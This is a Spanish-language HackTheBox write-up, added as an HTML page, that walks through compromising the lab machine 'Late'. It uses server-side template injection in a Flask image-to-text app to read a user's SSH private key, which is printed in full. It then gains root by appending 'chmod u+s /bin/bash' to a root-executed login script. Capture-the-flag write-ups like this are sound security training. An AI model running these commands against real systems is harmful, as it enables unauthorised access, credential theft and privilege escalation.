@@ -1,0 +1,350 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width initial-scale=1" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="robots" content="noindex">
+
+  <title>Writeup HackTheBox Late</title>
+
+  <meta name="description" content="Resolución de la máquina Late de la plataforma de HackTheBox">
+  <meta name="author" content="GatoGamer1155">
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Writeup HackTheBox Late">
+  <meta name="twitter:description" content="Resolución de la máquina Late de la plataforma de HackTheBox">
+  <meta name="twitter:creator" content="GatoGamer1155">  
+  <meta name="twitter:image" content="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/late.png" />
+
+  <meta property="og:site_name" content="GatoGamer1155" />
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Writeup HackTheBox Late">
+  <meta property="og:description" content="Resolución de la máquina Late de la plataforma de HackTheBox">
+  <meta property="og:image" content="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/late.png" />
+
+  <link rel="manifest" href="/images/favicons/manifest.json">
+  <link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/late.png">
+
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+  
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+
+  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
+  <link rel="canonical" href="http://localhost:4000/">
+  <link rel="alternate" type="application/rss+xml" title="Writeup HackTheBox Late" href="/feed.xml">
+</head>
+
+  <body style="background-color: #282828;">
+  
+    <span class="mobile btn-mobile-menu">
+      <i class="icon icon-list btn-mobile-menu__icon"></i>
+      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+<header class="panel-cover" style="background-image: url(/images/cover.jpg)">
+
+  <div class="panel-main">
+    <div class="panel-main__inner panel-inverted">
+      <div class="panel-main__content">
+
+          <img src="/images/profile.jpg" class="user-image zoomable" alt="GatoGamer1155">
+          <h1 class="panel-cover__title panel-title scale-up-center">GatoGamer1155</h1>
+
+        <hr class="panel-cover__divider">
+        <p class="panel-cover__description slide-top">Entusiasta del Hacking y CTFs</p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary">
+
+        <div class="navigation-wrapper">
+         <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+              <li class="navigation__item grow"><a href="/htb" title="GatoGamer1155" class="blog-button">HackTheBox</a></li>
+            </ul>
+          </nav>
+
+          <nav class="cover-navigation navigation--social">
+            <ul class="navigation">
+              
+              <li class="navigation__item grow">
+                <a href="https://github.com/gatogamer1155" title="Github" target="_blank">
+                  <i class="icon icon-social-github"></i>
+                  <span class="label">GitHub</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://twitter.com/gatogamer1155" title="Twitter" target="_blank">
+                  <i class="icon icon-social-twitter"></i>
+                  <span class="label">Twitter</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://instagram.com/gatogamer1155" title="Instagram" target="_blank">
+                  <i class="icon icon-social-instagram"></i>
+                  <span class="label">Instagram</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://youtube.com/@gatogamer1155" title="Youtube" target="_blank">
+                  <i class="icon icon-social-youtube"></i>
+                  <span class="label">Youtube</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="mailto:gatogamer1155@gmail.com" title="Correo Electronico" target="_blank">
+                  <i class="icon icon-mail"></i>
+                  <span class="label">Email</span>
+                </a>
+              </li>
+
+            </ul>
+          </nav>
+        </div>
+      </div>
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+    <br>
+    <div class="content-wrapper">
+      <div class="content-wrapper__inner">
+        <article class="post-container post-container--single">
+    <div class="izquierda">
+      <h3 class="post-title">Contenido</h3><br>
+      <ul>
+        <li><a href="#enumeration">Enumeración</a></li>
+        <li><a href="#shell-svc_acc">Shell - svc_acc</a></li>
+        <li><a href="#shell-root">Shell - root</a></li>
+      </ul>
+  </div>
+
+  <header class="post-header slide-top">
+    <h4 class="post-title">HackTheBox</h4>
+    <picture><img src="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/late.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
+    <h2 class="post-title">Late</h2><br>
+  </header>
+  
+<section class="post" id="enumeration">
+<br><h3 class="post-title">Enumeración</h3><br>
+
+<p class="plain-text">Iniciamos la máquina escaneando los puertos de la máquina con nmap, donde encontramos abiertos solo 2 puertos 22 y 80 (ssh y http respectivamente)</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ nmap </span><span class="p">10.10.11.156
+Nmap scan report for 10.10.11.156  
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al abrir la página principal podemos ver una web que nos habla de tener herramientas onnline mas sencillas de utilizar para editar imágenes</p>
+<a href="/htb/late/1.png" target="_blank"><div><p><img src="/htb/late/1.png"></p></div></a>
+
+<p class="plain-text">En el apartado de preguntas frecuentes se nos da un enlace a el editor de imágenes gratuito que nos redirige al dominio <code class="language-plaintext highlighter-rouge">images.late.htb</code></p>
+<a href="/htb/late/2.png" target="_blank"><div><p><img src="/htb/late/2.png"></p></div></a>
+
+<p class="plain-text">De primeras el navegador no sabrá a donde apuntar con ese dominio asi que le indicaremos la ip de la máquina agregandolo al archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code></p>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ echo </span><span class="am">"10.10.11.156 images.late.htb"</span><span class="p"> | </span><span class="ve">sudo tee</span><span class="p"> -a /etc/hosts  </span>
+</code></pre></div></div><br>
+</section>
+
+<section class="post" id="shell-svc_acc">
+<br><h3 class="post-title">Shell - svc_acc</h3><br>
+<p class="plain-text">Al abrir el nuevo dominio podemos ver una web que nos permite subir una imagen, y algo interesante es que nos dice que esta montado en Flask, que es reconocido por tener la vulnerabilidad de <code class="language-plaintext highlighter-rouge">Server Side Template Injection</code> en este tipo de CTFs</p>
+<a href="/htb/late/3.png" target="_blank"><div><p><img src="/htb/late/3.png"></p></div></a>
+
+<p class="plain-text">En mi caso subire la captura anterior para ver que es lo que hace, y al subirla nos intenta descargar un archivo con el nombre results.txt</p>
+<a href="/htb/late/4.png" target="_blank"><div><p><img src="/htb/late/4.png"></p></div></a>
+
+<p class="plain-text">Al leer el archivo txt que descargó, podemos ver que convierte el contenido visual de la imagen a un archivo de texto que contiene el html de lo que este en ella</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ cat </span><span class="p">results.txt
+
+&ltp>
+Convert image to texters
+
+If you want to turn an image into a text document, you came to the right place.  
+
+Convert your image now!
+
+Choose file Browse
+&lt/p></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ya que esta corriendo <code class="language-plaintext highlighter-rouge">Flask</code> podemos probar un clásico payload para explotar un SSTI, asi que tomamos una captura de pantalla con el payload como la siguiente</p>
+<a href="/htb/late/6.png" target="_blank"><div><p><img src="/htb/late/6.png"></p></div></a>
+
+<p class="plain-text">Al subir esa imagen nos descarga otro results.txt y podemos ver 49, la operación se ha computado por lo que es vulnerable a Server Side Template Injection</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ cat </span><span class="p">results.txt  
+
+&ltp>
+49
+&lt/p></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos usar un payload de <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2---remote-code-execution">PayloadsAllTheThings</a> y ejecutaremos el comando <code class="language-plaintext highlighter-rouge">id</code> para saber el usuario y <code class="language-plaintext highlighter-rouge">cat ~/.ssh/id_rsa</code> para leer su clave rsa privada</p>
+<a href="/htb/late/5.png" target="_blank"><div><p><img src="/htb/late/5.png"></p></div></a>
+
+<p class="plain-text">Al subir la imagen anterior nos devuelve otro results.txt donde nos muestra la salida de ambos comandos, el usuario es <code class="language-plaintext highlighter-rouge">svc_acc</code> y tambien podemos ver su clave privada</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ cat </span><span class="p">results.txt
+
+&ltp>
+
+uid=1000(svc_acc) gid=1000(svc_acc) groups=1000(svc_acc)
+
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEAqe5XWFKVqleCyfzPo4HsfRR8uF/P/3Tn+fiAUHhnGvBBAyrM
+HiP3S/DnqdIH2uqTXdPk4eGdXynzMnFRzbYb+cBa+R8T/nTa3PSuR9tkiqhXTaEO
+bgjRSynr2NuDWPQhX8OmhAKdJhZfErZUcbxiuncrKnoClZLQ6ZZDaNTtTUwpUaMi
+/mtaHzLID1KTl+dUFsLQYmdRUA639xkz1YvDF5ObIDoeHgOU7rZV4TqA6s6gI7W7
+d137M3Oi2WTWRBzcWTAMwfSJ2cEttvS/AnE/B2Eelj1shYUZuPyIoLhSMicGnhB7
+7IKpZeQ+MgksRcHJ5fJ2hvTu/T3yL9tggf9DsQIDAQABAoIBAHCBinbBhrGW6tLM
+fLSmimptq/1uAgoB3qxTaLDeZnUhaAmuxiGWcl5nCxoWInlAIX1XkwwyEb01yvw0
+ppJp5a+/OPwDJXus5lKv9MtCaBidR9/vp9wWHmuDP9D91MKKL6Z1pMN175GN8jgz
+W0lKDpuh1oRy708UOxjMEalQgCRSGkJYDpM4pJkk/c7aHYw6GQKhoN1en/7I50IZ
+uFB4CzS1bgAglNb7Y1bCJ913F5oWs0dvN5ezQ28gy92pGfNIJrk3cxO33SD9CCwC
+T9KJxoUhuoCuMs00PxtJMymaHvOkDYSXOyHHHPSlIJl2ZezXZMFswHhnWGuNe9IH
+Ql49ezkCgYEA0OTVbOT/EivAuu+QPaLvC0N8GEtn7uOPu9j1HjAvuOhom6K4troi
+WEBJ3pvIsrUlLd9J3cY7ciRxnbanN/Qt9rHDu9Mc+W5DQAQGPWFxk4bM7Zxnb7Ng
+Hr4+hcK+SYNn5fCX5qjmzE6c/5+sbQ20jhl20kxVT26MvoAB9+I1ku8CgYEA0EA7
+t4UB/PaoU0+kz1dNDEyNamSe5mXh/Hc/mX9cj5cQFABN9lBTcmfZ5R6I0ifXpZuq
+0xEKNYA3HS5qvOI3dHj6O4JZBDUzCgZFmlI5fslxLtl57WnlwSCGHLdP/knKxHIE
+uJBIk0KSZBeT8F7IfUukZjCYO0y4HtDP3DUqE18CgYBgI5EeRt4lrMFMx4io9V3y
+3yIzxDCXP2AdYiKdvCuafEv4pRFB97RqzVux+hyKMthjnkpOqTcetysbHL8k/1pQ
+GUwuG2FQYrDMu41rnnc5IGccTElGnVV1kLURtqkBCFs+9lXSsJVYHi4fb4tZvV8F
+ry6CZuM0ZXqdCijdvtxNPQKBgQC7F1oPEAGvP/INltncJPRlfkj2MpvHJfUXGhMb
+Vh7UKcUaEwP3rEar270YaIxHMeA9OlMH+KERW7UoFFF0jE+B5kX5PKu4agsGkIfr
+kr9wto1mp58wuhjdntid59qH+8edIUo4ffeVxRM7tSsFokHAvzpdTH8Xl1864CI+
+Fc1NRQKBgQDNiTT446GIijU7XiJEwhOec2m4ykdnrSVb45Y6HKD9VS6vGeOF1oAL
+K6+2ZlpmytN3RiR9UDJ4kjMjhJAiC7RBetZOor6CBKg20XA1oXS7o1eOdyc/jSk0
+kxruFUgLHh7nEx/5/0r8gmcoCvFn98wvUPSNrgDJ25mnwYI0zzDrEw==          
+-----END RSA PRIVATE KEY-----
+
+&lt/p></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Guardamos la clave privada en un archivo llamado id_rsa y despues de darle permiso 600 con <code class="language-plaintext highlighter-rouge">chmod 600 id_rsa</code> podemos conectarnos por ssh sin contraseña</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ssh </span><span class="p">svc_acc@10.10.11.156 -i id_rsa
+</span><span class="ve">svc_acc@late</span><span class="p">:</span><span class="az">~</span><span class="p">$ id
+uid=1000(svc_acc) gid=1000(svc_acc) groups=1000(svc_acc)  
+</span><span class="ve">svc_acc@late</span><span class="p">:</span><span class="az">~</span><span class="p">$ hostname -I
+10.10.11.156
+</span><span class="ve">svc_acc@late</span><span class="p">:</span><span class="az">~</span><span class="p">$ cat user.txt
+974**************************fd4
+</span><span class="ve">svc_acc@late</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+</section>
+
+<section class="post" id="shell-root">
+<br><h3 class="post-title">Shell - root</h3><br>
+
+<p class="plain-text">Si listamos procesos con <a href="https://github.com/DominicBreuker/pspy">pspy</a> e iniciamos sesión por ssh en otra terminal podemos ver que root ejecuta un script con bash en cada inicio de sesión de ssh</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="az">CMD: UID=0    PID=2227   | /bin/bash /usr/local/sbin/ssh-alert.sh  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos leer el archivo en bash que se ejecuta y lo que hace parece que es avisar a root mediante un mail cada inicio de sesión por ssh</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">svc_acc@late</span><span class="p">:</span><span class="az">~</span><span class="p">$ cat /usr/local/sbin/ssh-alert.sh
+#!/bin/bash
+
+RECIPIENT="root@late.htb"
+SUBJECT="Email from Server Login: SSH Alert"
+
+BODY="
+A SSH login was detected.
+
+        User:        $PAM_USER
+        User IP Host: $PAM_RHOST
+        Service:     $PAM_SERVICE
+        TTY:         $PAM_TTY
+        Date:        `date`
+        Server:      `uname -a`
+"
+
+if [ ${PAM_TYPE} = "open_session" ]; then
+        echo "Subject:${SUBJECT} ${BODY}" | /usr/sbin/sendmail ${RECIPIENT}  
+fi
+</span><span class="ve">svc_acc@late</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Si listamos los permisos podemos ver que nuestro usuario es el propietario, por lo que deberiamos tener permisos de escritura en el script de bash</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">svc_acc@late</span><span class="p">:</span><span class="az">/usr/local/sbin</span><span class="p">$ ls -l ssh-alert.sh 
+-rwxr-xr-x 1 svc_acc svc_acc 433 Mar 15 20:39 </span><span class="ve">ssh-alert.sh  
+</span><span class="ve">svc_acc@late</span><span class="p">:</span><span class="az">/usr/local/sbin</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Sin embargo al intentar escribir nos dice que no tenemos permitido hacerlo</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">svc_acc@late</span><span class="p">:</span><span class="az">/usr/local/sbin</span><span class="p">$ echo "test" > ssh-alert.sh  
+-bash: ssh-alert.sh: Operation not permitted
+</span><span class="ve">svc_acc@late</span><span class="p">:</span><span class="az">/usr/local/sbin</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al listar privilegios mas avanzados encontramos que solo tenemos permiso de hacer un append pero no de sobreescribir el contenido ya existente en el archivo</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">svc_acc@late</span><span class="p">:</span><span class="az">/usr/local/sbin</span><span class="p">$ lsattr ssh-alert.sh  
+-----a--------e--- ssh-alert.sh
+</span><span class="ve">svc_acc@late</span><span class="p">:</span><span class="az">/usr/local/sbin</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Hacemos un append del comando <code class="language-plaintext highlighter-rouge">chmod u+s /bin/bash</code> para cuando root ejecute el script asigne privilegios suid a la bash y podamos obtener su uid temporalmente</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">svc_acc@late</span><span class="p">:</span><span class="az">/usr/local/sbin</span><span class="p">$ echo "chmod u+s /bin/bash" >> ssh-alert.sh  
+</span><span class="ve">svc_acc@late</span><span class="p">:</span><span class="az">/usr/local/sbin</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora salimos y volvemos a loguearnos para que root ejecute el comando en el script</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">svc_acc@late</span><span class="p">:</span><span class="az">/usr/local/sbin</span><span class="p">$ exit
+logout
+Connection to 10.10.11.156 closed.
+
+</span><span class="ve">❯ ssh </span><span class="p">svc_acc@10.10.11.156 -i id_rsa  
+-bash-4.4$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">El comando se ha ejecutado por lo que ahora la bash tiene privilegios suid, con el comando <code class="language-plaintext highlighter-rouge">bash -p</code> obtenemos su uid temporalmente y nos convertimos en root</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">-bash-4.4$ ls -l /bin/bash
+-rwsr-xr-x 1 root root 1113504 Jun  6  2019 </span><span class="err">/bin/bash</span><span class="p">  
+-bash-4.4$ bash -p
+bash-4.4# whoami
+root
+bash-4.4# hostname -I
+10.10.11.156
+bash-4.4# cat /root/root.txt
+9e3**************************b96
+bash-4.4#</span>
+</code></pre></div></div><br>
+</section>
+
+</article>
+  </div>
+  <footer class="footer">
+    <span class="footer__copyright">&copy; 2023 - GatoGamer1155</span>
+  </footer><br><br>
+
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>
+
+    </div>
+  </body>
+</html>
